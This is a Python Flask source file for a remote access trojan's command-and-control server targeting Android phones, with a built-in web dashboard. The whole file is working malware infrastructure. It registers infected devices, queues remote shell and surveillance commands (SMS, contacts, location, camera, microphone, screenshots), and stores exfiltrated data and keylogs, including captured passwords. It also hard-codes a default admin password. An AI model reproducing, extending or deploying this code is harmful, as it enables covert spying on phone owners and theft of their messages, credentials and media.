#!/usr/bin/env python3
"""
RAT C2 Server - Command and Control Server for Android RAT
Built for GitHub Codespaces deployment
"""

import os
import json
import uuid
import base64
import hashlib
import secrets
import asyncio
import threading
import time
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Any

from flask import Flask, request, jsonify, send_file, render_template_string
from flask_socketio import SocketIO, emit, disconnect
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
import sqlite3
import logging

# Configuration
class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY', secrets.token_hex(32))
    DATABASE = os.environ.get('DATABASE', 'c2_server.db')
    HOST = os.environ.get('HOST', '0.0.0.0')
    PORT = int(os.environ.get('PORT', 8080))
    WS_PORT = int(os.environ.get('WS_PORT', 8081))
    DEBUG = os.environ.get('DEBUG', 'false').lower() == 'true'
    MAX_CONTENT_LENGTH = 100 * 1024 * 1024  # 100MB
    UPLOAD_FOLDER = os.environ.get('UPLOAD_FOLDER', 'uploads')
    ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'admin')
    ADMIN_PASSWORD_HASH = os.environ.get('ADMIN_PASSWORD_HASH', generate_password_hash('ratadmin123'))
    SESSION_TIMEOUT = int(os.environ.get('SESSION_TIMEOUT', 3600))  # 1 hour
    ENCRYPTION_KEY = os.environ.get('ENCRYPTION_KEY', secrets.token_hex(32))

app = Flask(__name__)
app.config.from_object(Config)
CORS(app)

# SocketIO for real-time communication
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# Setup logging
logging.basicConfig(
    level=logging.INFO if not Config.DEBUG else logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Ensure upload directory exists
os.makedirs(Config.UPLOAD_FOLDER, exist_ok=True)

# Database initialization
def init_db():
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()

    # Devices table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY,
            device_id TEXT UNIQUE NOT NULL,
            model TEXT,
            brand TEXT,
            manufacturer TEXT,
            android_version TEXT,
            sdk_int INTEGER,
            root_status BOOLEAN,
            last_seen TIMESTAMP,
            first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            is_active BOOLEAN DEFAULT 1,
            notes TEXT
        )
    ''')

    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            action TEXT NOT NULL,
            payload TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            executed_at TIMESTAMP,
            completed_at TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (device_id)
        )
    ''')

    # Data exfiltration table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS exfiltrated_data (
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            data_type TEXT NOT NULL,
            data TEXT,
            file_path TEXT,
            size INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (device_id)
        )
    ''')

    # Keylogs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keylogs (
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            package TEXT,
            class_name TEXT,
            text TEXT,
            is_password BOOLEAN,
            timestamp TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (device_id)
        )
    ''')

    # Screenshots/Media table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS media (
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            media_type TEXT NOT NULL,
            file_path TEXT,
            thumbnail_path TEXT,
            size INTEGER,
            width INTEGER,
            height INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (device_id)
        )
    ''')

    # Shell sessions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS shell_sessions (
            id TEXT PRIMARY KEY,
            device_id TEXT NOT NULL,
            session_id TEXT NOT NULL,
            command TEXT,
            output TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (device_id) REFERENCES devices (device_id)
        )
    ''')

    # Admin users table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS admin_users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'admin',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_login TIMESTAMP
        )
    ''')

    # Audit log table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS audit_log (
            id TEXT PRIMARY KEY,
            user_id TEXT,
            action TEXT NOT NULL,
            details TEXT,
            ip_address TEXT,
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    conn.commit()
    conn.close()

    # Create default admin user
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM admin_users WHERE username = ?', (Config.ADMIN_USERNAME,))
    if not cursor.fetchone():
        cursor.execute('''
            INSERT INTO admin_users (id, username, password_hash, role)
            VALUES (?, ?, ?, ?)
        ''', (str(uuid.uuid4()), Config.ADMIN_USERNAME, Config.ADMIN_PASSWORD_HASH, 'superadmin'))
        conn.commit()
    conn.close()

# Encryption utilities
def encrypt_data(data: str) -> str:
    """Simple XOR encryption for demonstration - replace with proper AES in production"""
    key = Config.ENCRYPTION_KEY.encode()
    data_bytes = data.encode()
    encrypted = bytes(a ^ b for a, b in zip(data_bytes, key * (len(data_bytes) // len(key) + 1)))
    return base64.b64encode(encrypted).decode()

def decrypt_data(encrypted_data: str) -> str:
    """Decrypt data encrypted with encrypt_data"""
    key = Config.ENCRYPTION_KEY.encode()
    encrypted_bytes = base64.b64decode(encrypted_data.encode())
    decrypted = bytes(a ^ b for a, b in zip(encrypted_bytes, key * (len(encrypted_bytes) // len(key) + 1)))
    return decrypted.decode()

# Authentication decorator
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get('Authorization')
        if not auth_header or not auth_header.startswith('Bearer '):
            return jsonify({'error': 'Missing or invalid authorization header'}), 401

        token = auth_header.split(' ')[1]
        # Validate token (simplified - use JWT in production)
        conn = sqlite3.connect(Config.DATABASE)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM admin_users WHERE id = ?', (token,))
        user = cursor.fetchone()
        conn.close()

        if not user:
            return jsonify({'error': 'Invalid token'}), 401

        request.user = user
        return f(*args, **kwargs)
    return decorated

# Device tracking
connected_devices = {}

# ===== REST API Routes =====

@app.route('/')
def index():
    return jsonify({
        'name': 'RAT C2 Server',
        'version': '1.0.0',
        'status': 'running',
        'connected_devices': len(connected_devices),
        'endpoints': {
            'register': 'POST /api/register',
            'heartbeat': 'POST /api/heartbeat',
            'command': 'POST /api/command',
            'commands': 'GET /api/commands/<device_id>',
            'devices': 'GET /api/devices',
            'device': 'GET /api/devices/<device_id>',
            'exfil': 'GET /api/exfil/<device_id>',
            'keylogs': 'GET /api/keylogs/<device_id>',
            'media': 'GET /api/media/<device_id>',
            'shell': 'POST /api/shell',
            'upload': 'POST /api/upload',
            'download': 'GET /api/download/<file_id>',
            'login': 'POST /api/auth/login',
            'logout': 'POST /api/auth/logout'
        }
    })

@app.route('/api/register', methods=['POST'])
def register_device():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400

        # Decrypt if encrypted
        if data.get('encrypted'):
            try:
                decrypted = decrypt_data(data['payload'])
                device_info = json.loads(decrypted)
            except Exception as e:
                logger.error(f"Decryption failed: {e}")
                return jsonify({'error': 'Decryption failed'}), 400
        else:
            device_info = data

        device_id = device_info.get('device_id')
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400

        # Store/update device in database
        conn = sqlite3.connect(Config.DATABASE)
        cursor = conn.cursor()

        cursor.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,))
        existing = cursor.fetchone()

        now = datetime.utcnow().isoformat()
        ip = request.remote_addr

        if existing:
            cursor.execute('''
                UPDATE devices SET
                    model = ?, brand = ?, manufacturer = ?, android_version = ?,
                    sdk_int = ?, root_status = ?, last_seen = ?, ip_address = ?,
                    is_active = 1
                WHERE device_id = ?
            ''', (
                device_info.get('model'),
                device_info.get('brand'),
                device_info.get('manufacturer'),
                device_info.get('android_version'),
                device_info.get('sdk_int'),
                device_info.get('is_rooted', False),
                now,
                ip,
                device_id
            ))
        else:
            cursor.execute('''
                INSERT INTO devices (id, device_id, model, brand, manufacturer, android_version,
                    sdk_int, root_status, last_seen, first_seen, ip_address, is_active)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
            ''', (
                str(uuid.uuid4()), device_id,
                device_info.get('model'),
                device_info.get('brand'),
                device_info.get('manufacturer'),
                device_info.get('android_version'),
                device_info.get('sdk_int'),
                device_info.get('is_rooted', False),
                now, now, ip
            ))

        conn.commit()
        conn.close()

        # Track connected device
        connected_devices[device_id] = {
            'last_seen': now,
            'ip': ip,
            'info': device_info
        }

        logger.info(f"Device registered: {device_id} from {ip}")
        return jsonify({'success': True, 'device_id': device_id, 'server_time': now})

    except Exception as e:
        logger.error(f"Registration error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400

        if data.get('encrypted'):
            try:
                decrypted = decrypt_data(data['payload'])
                heartbeat_data = json.loads(decrypted)
            except Exception as e:
                return jsonify({'error': 'Decryption failed'}), 400
        else:
            heartbeat_data = data

        device_id = heartbeat_data.get('device_id') or data.get('device_id')
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400

        # Update last seen
        conn = sqlite3.connect(Config.DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE devices SET last_seen = ?, is_active = 1 WHERE device_id = ?
        ''', (datetime.utcnow().isoformat(), device_id))
        conn.commit()
        conn.close()

        # Update connected devices
        if device_id in connected_devices:
            connected_devices[device_id]['last_seen'] = datetime.utcnow().isoformat()

        # Check for pending commands
        conn = sqlite3.connect(Config.DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            SELECT id, action, payload FROM commands
            WHERE device_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 50
        ''', (device_id,))
        commands = cursor.fetchall()
        conn.close()

        return jsonify({
            'success': True,
            'commands': [
                {'id': cmd[0], 'action': cmd[1], 'payload': cmd[2]}
                for cmd in commands
            ],
            'server_time': datetime.utcnow().isoformat()
        })

    except Exception as e:
        logger.error(f"Heartbeat error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def submit_command_result():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data provided'}), 400

        command_id = data.get('id')
        result = data.get('result')
        success = data.get('success', True)

        if not command_id:
            return jsonify({'error': 'Missing command id'}), 400

        conn = sqlite3.connect(Config.DATABASE)
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE commands SET
                status = ?,
                result = ?,
                completed_at = ?
            WHERE id = ?
        ''', ('completed' if success else 'failed', json.dumps(result), datetime.utcnow().isoformat(), command_id))
        conn.commit()
        conn.close()

        logger.info(f"Command {command_id} completed: {'success' if success else 'failed'}")
        return jsonify({'success': True})

    except Exception as e:
        logger.error(f"Command result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<device_id>', methods=['GET'])
@require_auth
def get_commands(device_id):
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, action, payload, status, result, created_at, executed_at, completed_at
        FROM commands WHERE device_id = ? ORDER BY created_at DESC LIMIT 100
    ''', (device_id,))
    commands = cursor.fetchall()
    conn.close()

    return jsonify({
        'commands': [
            {
                'id': cmd[0],
                'action': cmd[1],
                'payload': cmd[2],
                'status': cmd[3],
                'result': cmd[4],
                'created_at': cmd[5],
                'executed_at': cmd[6],
                'completed_at': cmd[7]
            }
            for cmd in commands
        ]
    })

@app.route('/api/devices', methods=['GET'])
@require_auth
def get_devices():
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, device_id, model, brand, manufacturer, android_version, sdk_int,
            root_status, last_seen, first_seen, ip_address, is_active
        FROM devices ORDER BY last_seen DESC
    ''')
    devices = cursor.fetchall()
    conn.close()

    return jsonify({
        'devices': [
            {
                'id': d[0],
                'device_id': d[1],
                'model': d[2],
                'brand': d[3],
                'manufacturer': d[4],
                'android_version': d[5],
                'sdk_int': d[6],
                'root_status': bool(d[7]),
                'last_seen': d[8],
                'first_seen': d[9],
                'ip_address': d[10],
                'is_active': bool(d[11]),
                'online': d[1] in connected_devices and
                    (datetime.utcnow() - datetime.fromisoformat(connected_devices[d[1]]['last_seen'])).seconds < 120
            }
            for d in devices
        ]
    })

@app.route('/api/devices/<device_id>', methods=['GET'])
@require_auth
def get_device(device_id):
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,))
    device = cursor.fetchone()
    conn.close()

    if not device:
        return jsonify({'error': 'Device not found'}), 404

    return jsonify({
        'device': {
            'id': device[0],
            'device_id': device[1],
            'model': device[2],
            'brand': device[3],
            'manufacturer': device[4],
            'android_version': device[5],
            'sdk_int': device[6],
            'root_status': bool(device[7]),
            'last_seen': device[8],
            'first_seen': device[9],
            'ip_address': device[10],
            'is_active': bool(device[11]),
            'notes': device[12] if len(device) > 12 else ''
        }
    })

@app.route('/api/exfil/<device_id>', methods=['GET'])
@require_auth
def get_exfiltrated_data(device_id):
    data_type = request.args.get('type')
    limit = int(request.args.get('limit', 100))

    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()

    if data_type:
        cursor.execute('''
            SELECT id, data_type, data, file_path, size, created_at
            FROM exfiltrated_data WHERE device_id = ? AND data_type = ?
            ORDER BY created_at DESC LIMIT ?
        ''', (device_id, data_type, limit))
    else:
        cursor.execute('''
            SELECT id, data_type, data, file_path, size, created_at
            FROM exfiltrated_data WHERE device_id = ?
            ORDER BY created_at DESC LIMIT ?
        ''', (device_id, limit))

    data = cursor.fetchall()
    conn.close()

    return jsonify({
        'data': [
            {
                'id': d[0],
                'type': d[1],
                'data': d[2],
                'file_path': d[3],
                'size': d[4],
                'created_at': d[5]
            }
            for d in data
        ]
    })

@app.route('/api/keylogs/<device_id>', methods=['GET'])
@require_auth
def get_keylogs(device_id):
    limit = int(request.args.get('limit', 500))

    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT id, package, class_name, text, is_password, timestamp
        FROM keylogs WHERE device_id = ? ORDER BY timestamp DESC LIMIT ?
    ''', (device_id, limit))
    logs = cursor.fetchall()
    conn.close()

    return jsonify({
        'keylogs': [
            {
                'id': log[0],
                'package': log[1],
                'class_name': log[2],
                'text': log[3],
                'is_password': bool(log[4]),
                'timestamp': log[5]
            }
            for log in logs
        ]
    })

@app.route('/api/media/<device_id>', methods=['GET'])
@require_auth
def get_media(device_id):
    media_type = request.args.get('type')
    limit = int(request.args.get('limit', 50))

    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()

    if media_type:
        cursor.execute('''
            SELECT id, media_type, file_path, thumbnail_path, size, width, height, created_at
            FROM media WHERE device_id = ? AND media_type = ? ORDER BY created_at DESC LIMIT ?
        ''', (device_id, media_type, limit))
    else:
        cursor.execute('''
            SELECT id, media_type, file_path, thumbnail_path, size, width, height, created_at
            FROM media WHERE device_id = ? ORDER BY created_at DESC LIMIT ?
        ''', (device_id, limit))

    media = cursor.fetchall()
    conn.close()

    return jsonify({
        'media': [
            {
                'id': m[0],
                'type': m[1],
                'file_path': m[2],
                'thumbnail_path': m[3],
                'size': m[4],
                'width': m[5],
                'height': m[6],
                'created_at': m[7]
            }
            for m in media
        ]
    })

@app.route('/api/shell', methods=['POST'])
@require_auth
def shell_command():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    device_id = data.get('device_id')
    command = data.get('command')
    session_id = data.get('session_id', str(uuid.uuid4()))

    if not device_id or not command:
        return jsonify({'error': 'Missing device_id or command'}), 400

    # Queue command for device
    command_id = str(uuid.uuid4())
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO commands (id, device_id, action, payload, status)
        VALUES (?, ?, ?, ?, 'pending')
    ''', (command_id, device_id, 'shell', json.dumps({'command': command, 'session_id': session_id})))
    conn.commit()
    conn.close()

    return jsonify({'success': True, 'command_id': command_id, 'session_id': session_id})

@app.route('/api/upload', methods=['POST'])
@require_auth
def upload_file():
    if 'file' not in request.files:
        return jsonify({'error': 'No file provided'}), 400

    file = request.files['file']
    device_id = request.form.get('device_id')
    remote_path = request.form.get('remote_path')

    if not device_id or not remote_path:
        return jsonify({'error': 'Missing device_id or remote_path'}), 400

    if file.filename == '':
        return jsonify({'error': 'No file selected'}), 400

    filename = secure_filename(file.filename)
    file_id = str(uuid.uuid4())
    file_path = os.path.join(Config.UPLOAD_FOLDER, f"{file_id}_{filename}")
    file.save(file_path)

    # Queue upload command for device
    command_id = str(uuid.uuid4())
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO commands (id, device_id, action, payload, status)
        VALUES (?, ?, ?, ?, 'pending')
    ''', (command_id, device_id, 'upload_file', json.dumps({
        'file_id': file_id,
        'filename': filename,
        'remote_path': remote_path,
        'size': os.path.getsize(file_path)
    })))
    conn.commit()
    conn.close()

    return jsonify({'success': True, 'file_id': file_id, 'command_id': command_id})

@app.route('/api/download/<file_id>', methods=['GET'])
@require_auth
def download_file(file_id):
    # Find file in upload folder
    for filename in os.listdir(Config.UPLOAD_FOLDER):
        if filename.startswith(f"{file_id}_"):
            file_path = os.path.join(Config.UPLOAD_FOLDER, filename)
            return send_file(file_path, as_attachment=True, download_name=filename.split('_', 1)[1])

    return jsonify({'error': 'File not found'}), 404

@app.route('/api/auth/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data:
        return jsonify({'error': 'No data provided'}), 400

    username = data.get('username')
    password = data.get('password')

    if not username or not password:
        return jsonify({'error': 'Missing username or password'}), 400

    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT id, password_hash, role FROM admin_users WHERE username = ?', (username,))
    user = cursor.fetchone()

    if user and check_password_hash(user[1], password):
        token = user[0]  # Use user ID as token (simplified)
        cursor.execute('UPDATE admin_users SET last_login = ? WHERE id = ?', (datetime.utcnow().isoformat(), user[0]))
        conn.commit()
        conn.close()

        # Log audit
        log_audit(user[0], 'login', f'User {username} logged in', request.remote_addr)

        return jsonify({
            'success': True,
            'token': token,
            'username': username,
            'role': user[2]
        })

    conn.close()
    return jsonify({'error': 'Invalid credentials'}), 401

@app.route('/api/auth/logout', methods=['POST'])
@require_auth
def logout():
    log_audit(request.user[0], 'logout', 'User logged out', request.remote_addr)
    return jsonify({'success': True})

# ===== WebSocket Events =====

@socketio.on('connect')
def handle_connect():
    logger.info(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    logger.info(f"Client disconnected: {request.sid}")

@socketio.on('authenticate')
def handle_authenticate(data):
    token = data.get('token')
    if not token:
        emit('auth_error', {'error': 'No token provided'})
        return

    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM admin_users WHERE id = ?', (token,))
    user = cursor.fetchone()
    conn.close()

    if user:
        emit('authenticated', {'success': True, 'user': {'id': user[0], 'username': user[1], 'role': user[2]}})
    else:
        emit('auth_error', {'error': 'Invalid token'})

@socketio.on('subscribe_device')
def handle_subscribe_device(data):
    device_id = data.get('device_id')
    if device_id:
        # Join room for device updates
        from flask_socketio import join_room
        join_room(f"device_{device_id}")
        emit('subscribed', {'device_id': device_id})

@socketio.on('send_command')
def handle_send_command(data):
    token = data.get('token')
    device_id = data.get('device_id')
    action = data.get('action')
    payload = data.get('payload', {})

    if not all([token, device_id, action]):
        emit('command_error', {'error': 'Missing required fields'})
        return

    # Validate token
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM admin_users WHERE id = ?', (token,))
    user = cursor.fetchone()
    conn.close()

    if not user:
        emit('command_error', {'error': 'Invalid token'})
        return

    # Queue command
    command_id = str(uuid.uuid4())
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO commands (id, device_id, action, payload, status)
        VALUES (?, ?, ?, ?, 'pending')
    ''', (command_id, device_id, action, json.dumps(payload)))
    conn.commit()
    conn.close()

    # Emit to device room if connected via WebSocket
    emit('command_queued', {
        'command_id': command_id,
        'device_id': device_id,
        'action': action
    }, room=f"device_{device_id}")

# ===== Helper Functions =====

def log_audit(user_id: str, action: str, details: str, ip: str):
    conn = sqlite3.connect(Config.DATABASE)
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO audit_log (id, user_id, action, details, ip_address)
        VALUES (?, ?, ?, ?, ?)
    ''', (str(uuid.uuid4()), user_id, action, details, ip))
    conn.commit()
    conn.close()

# ===== Web Dashboard =====

DASHBOARD_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>RAT C2 Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #1a1a2e; color: #eee; }
        .header { background: #16213e; padding: 1rem 2rem; border-bottom: 1px solid #0f3460; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { color: #e94560; font-size: 1.5rem; }
        .container { display: flex; height: calc(100vh - 60px); }
        .sidebar { width: 280px; background: #16213e; border-right: 1px solid #0f3460; overflow-y: auto; }
        .main { flex: 1; padding: 2rem; overflow-y: auto; }
        .device-list { padding: 1rem; }
        .device-item { background: #0f3460; border-radius: 8px; padding: 1rem; margin-bottom: 0.5rem; cursor: pointer; transition: all 0.2s; }
        .device-item:hover, .device-item.active { background: #e94560; border-left: 3px solid #fff; }
        .device-item.online::before { content: '●'; color: #00ff00; margin-right: 8px; }
        .device-item.offline::before { content: '●'; color: #ff0000; margin-right: 8px; }
        .device-info { font-size: 0.85rem; color: #aaa; margin-top: 0.5rem; }
        .panel { background: #16213e; border-radius: 8px; padding: 1.5rem; margin-bottom: 1rem; }
        .panel h2 { color: #e94560; margin-bottom: 1rem; font-size: 1.2rem; }
        .btn { background: #e94560; color: white; border: none; padding: 0.5rem 1rem; border-radius: 4px; cursor: pointer; margin-right: 0.5rem; }
        .btn:hover { background: #d63650; }
        .btn.secondary { background: #0f3460; }
        .input { background: #0f3460; border: 1px solid #0f3460; color: #eee; padding: 0.5rem; border-radius: 4px; width: 100%; margin-bottom: 0.5rem; }
        .log-entry { font-family: monospace; font-size: 0.85rem; padding: 0.5rem; background: #0f3460; margin-bottom: 0.25rem; border-radius: 4px; }
        .log-entry.error { border-left: 3px solid #e94560; }
        .log-entry.success { border-left: 3px solid #00ff00; }
        .log-entry.warning { border-left: 3px solid #ffaa00; }
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 0.75rem; text-align: left; border-bottom: 1px solid #0f3460; }
        th { color: #e94560; font-weight: 600; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; align-items: center; justify-content: center; }
        .modal.active { display: flex; }
        .modal-content { background: #16213e; padding: 2rem; border-radius: 8px; max-width: 500px; width: 90%; max-height: 80vh; overflow-y: auto; }
        .tabs { display: flex; border-bottom: 1px solid #0f3460; margin-bottom: 1rem; }
        .tab { padding: 0.75rem 1.5rem; cursor: pointer; color: #aaa; }
        .tab.active { color: #e94560; border-bottom: 2px solid #e94560; }
        .tab-content { display: none; }
        .tab-content.active { display: block; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🕷️ RAT C2 Dashboard</h1>
        <div>
            <span id="deviceCount">0 devices</span>
            <button class="btn secondary" onclick="refreshDevices()">Refresh</button>
        </div>
    </div>

    <div class="container">
        <div class="sidebar">
            <div class="device-list" id="deviceList">
                <div style="padding: 1rem; color: #666;">Loading devices...</div>
            </div>
        </div>

        <div class="main">
            <div class="panel">
                <h2>Send Command</h2>
                <select id="commandAction" class="input">
                    <option value="device_info">Device Info</option>
                    <option value="get_sms">Get SMS</option>
                    <option value="get_calls">Get Call Logs</option>
                    <option value="get_contacts">Get Contacts</option>
                    <option value="get_location">Get Location</option>
                    <option value="list_files">List Files</option>
                    <option value="list_apps">List Apps</option>
                    <option value="take_photo">Take Photo</option>
                    <option value="screenshot">Screenshot</option>
                    <option value="record_audio">Record Audio</option>
                    <option value="shell">Shell Command</option>
                    <option value="get_keylogs">Get Keylogs</option>
                </select>
                <textarea id="commandPayload" class="input" rows="3" placeholder='JSON payload (e.g. {"limit": 50})'></textarea>
                <button class="btn" onclick="sendCommand()">Send Command</button>
            </div>

            <div class="panel">
                <h2>Command History</h2>
                <table id="commandTable">
                    <thead>
                        <tr><th>Time</th><th>Action</th><th>Status</th><th>Result</th></tr>
                    </thead>
                    <tbody></tbody>
                </table>
            </div>

            <div class="panel">
                <h2>Live Logs</h2>
                <div id="logContainer" style="max-height: 300px; overflow-y: auto;"></div>
            </div>
        </div>
    </div>

    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        const socket = io();
        let currentDevice = null;
        let authToken = null;

        // Login prompt
        async function login() {
            const username = prompt('Username:') || 'admin';
            const password = prompt('Password:') || 'ratadmin123';

            const res = await fetch('/api/auth/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, password })
            });
            const data = await res.json();
            if (data.success) {
                authToken = data.token;
                socket.emit('authenticate', { token: authToken });
                loadDevices();
            } else {
                alert('Login failed');
                login();
            }
        }

        socket.on('authenticated', (data) => {
            console.log('Authenticated:', data);
        });

        socket.on('auth_error', (data) => {
            alert('Auth error: ' + data.error);
            login();
        });

        async function loadDevices() {
            const res = await fetch('/api/devices', {
                headers: { 'Authorization': `Bearer ${authToken}` }
            });
            const data = await res.json();
            renderDevices(data.devices);
        }

        function renderDevices(devices) {
            const container = document.getElementById('deviceList');
            container.innerHTML = '';
            document.getElementById('deviceCount').textContent = `${devices.length} devices`;

            devices.forEach(device => {
                const div = document.createElement('div');
                div.className = `device-item ${device.online ? 'online' : 'offline'}`;
                div.onclick = () => selectDevice(device);
                div.innerHTML = `
                    <strong>${device.model || 'Unknown'} (${device.brand || ''})</strong>
                    <div class="device-info">
                        ID: ${device.device_id.substring(0, 16)}...<br>
                        Android ${device.android_version} (API ${device.sdk_int})<br>
                        IP: ${device.ip_address}<br>
                        Last seen: ${new Date(device.last_seen).toLocaleString()}<br>
                        ${device.root_status ? '🔓 Rooted' : '🔒 Not rooted'}
                    </div>
                `;
                container.appendChild(div);
            });
        }

        function selectDevice(device) {
            currentDevice = device;
            document.querySelectorAll('.device-item').forEach(el => el.classList.remove('active'));
            event.currentTarget.classList.add('active');
            loadCommandHistory(device.device_id);
            loadExfilData(device.device_id);
            socket.emit('subscribe_device', { device_id: device.device_id });
        }

        async function loadCommandHistory(deviceId) {
            const res = await fetch(`/api/commands/${deviceId}`, {
                headers: { 'Authorization': `Bearer ${authToken}` }
            });
            const data = await res.json();
            const tbody = document.querySelector('#commandTable tbody');
            tbody.innerHTML = '';
            data.commands.forEach(cmd => {
                const tr = document.createElement('tr');
                tr.innerHTML = `
                    <td>${new Date(cmd.created_at).toLocaleTimeString()}</td>
                    <td>${cmd.action}</td>
                    <td>${cmd.status}</td>
                    <td>${cmd.result ? (typeof cmd.result === 'string' ? cmd.result.substring(0, 50) : JSON.stringify(cmd.result).substring(0, 50)) : 'Pending'}</td>
                `;
                tbody.appendChild(tr);
            });
        }

        async function loadExfilData(deviceId) {
            // Load keylogs, media, etc.
        }

        function sendCommand() {
            if (!currentDevice) return alert('Select a device first');

            const action = document.getElementById('commandAction').value;
            let payload = {};
            try {
                payload = JSON.parse(document.getElementById('commandPayload').value || '{}');
            } catch (e) {
                return alert('Invalid JSON payload');
            }

            fetch('/api/shell', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${authToken}`
                },
                body: JSON.stringify({
                    device_id: currentDevice.device_id,
                    action: action,
                    payload: payload
                })
            }).then(res => res.json()).then(data => {
                if (data.success) {
                    addLog(`Command sent: ${action} (ID: ${data.command_id})`, 'success');
                    loadCommandHistory(currentDevice.device_id);
                } else {
                    addLog(`Error: ${data.error}`, 'error');
                }
            });
        }

        function addLog(message, type = 'info') {
            const container = document.getElementById('logContainer');
            const div = document.createElement('div');
            div.className = `log-entry ${type}`;
            div.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            container.insertBefore(div, container.firstChild);
            if (container.children.length > 100) container.removeChild(container.lastChild);
        }

        function refreshDevices() {
            loadDevices();
        }

        // Auto-refresh
        setInterval(() => {
            if (currentDevice) loadCommandHistory(currentDevice.device_id);
        }, 5000);

        // Initialize
        login();
    </script>
</body>
</html>
"""

@app.route('/dashboard')
def dashboard():
    return DASHBOARD_HTML

# ===== Main =====

if __name__ == '__main__':
    init_db()
